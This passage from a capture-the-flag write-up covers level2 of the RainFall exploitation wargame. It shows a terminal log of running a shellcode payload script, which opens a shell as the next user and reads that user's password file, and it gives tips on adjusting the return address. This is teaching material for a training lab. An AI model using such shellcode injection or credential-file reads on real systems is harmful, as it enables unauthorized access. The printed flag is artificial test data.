Read the requirements in payload.sh, then simply execute it from anywhere, here I placed it at /tmp/buffer.sh:

```sh
level2@RainFall:~$ /tmp/payload.sh 
/tmp/payload.sh: line 1: EQUIREMENTS:: command not found
j
 X�Rh//shh/bin��1�̀������������������������������������������������������
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Nothing appears when executing the .sh besides the this weird combination of characters but you are indeed in a new shell.
*The reproduction made on source.c will probably have a completely different address tho, then you can replace ADDRESS_LITTLE_ENDIAN variable in the payload.sh script. (See README.md to know how to find the new address)*